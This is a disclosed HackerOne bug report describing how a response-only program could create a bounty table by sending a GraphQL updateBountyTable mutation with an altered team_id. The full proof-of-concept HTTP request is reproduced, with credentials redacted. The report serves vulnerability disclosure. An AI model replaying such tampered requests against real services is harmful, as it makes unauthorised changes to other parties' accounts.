# Response program can create bounty table

## Report Details
- **Report ID**: 460920
- **URL**: https://hackerone.com/reports/460920
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-12-12T01:59:53.899Z
- **Disclosed**: 2019-01-07T15:37:42.943Z

## Reporter
- **Username**: nguyenlv7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Follow [h1 document] (https://docs.hackerone.com/programs/bounty-tables.html#___gatsby), create bounty table only available for bounty program.

**Description:**
* Step1: Create request to graphql  entrypoint
* Step2: Change team id in parameter like this: "team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMzYyOTE=" (base_64 encode)

```
POST /graphql HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bountyprogram/reward_settings
content-type: application/json
x-auth-token: █████████
origin: https://hackerone.com
Content-Length: 1512
Connection: close
Cookie: ███████

{"query":"mutation Update_bounty_table_mutation($input_0:UpdateBountyTableInput!,$first_1:Int!,$types_2:[ErrorTypeEnum]!) {\n  updateBountyTable(input:$input_0) {\n    clientMutationId,\n    ...F1,\n    ...F2\n  }\n}\nfragment F0 on Team {\n  id,\n  bounty_table {\n    low_label,\n    medium_label,\n    high_label,\n    critical_label,\n    description,\n    _bounty_table_rows3iMmxf:bounty_table_rows(first:$first_1) {\n      edges {\n        node {\n          id,\n          low,\n          medium,\n          high,\n          critical,\n          structured_scope {\n            id\n          }\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id,\n    team {\n      id\n    }\n  }\n}\nfragment F1 on UpdateBountyTablePayload {\n  team {\n    id,\n    ...F0\n  }\n}\nfragment F2 on UpdateBountyTablePayload {\n  was_successful,\n  _errors2S3JlH:errors(types:$types_2) {\n    edges {\n      node {\n        type,\n        field,\n        message,\n        id\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  }\n}","variables":{"input_0":{"team_id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMzYyOTE=","bounty_table_rows":[{"id":null,"destroy":false,"low":100,"medium":100,"high":100,"critical":100,"structured_scope_id":null}],"low_label":"Low","medium_label":"Medium","high_label":"High","critical_label":"Critical","description":"","clientMutationId":"0"},"first_1":100,"types_2":"ARGUMENT"}}
```

## Impact

* Create bounty table in response program and show it in home page.

## Attachments
No attachments
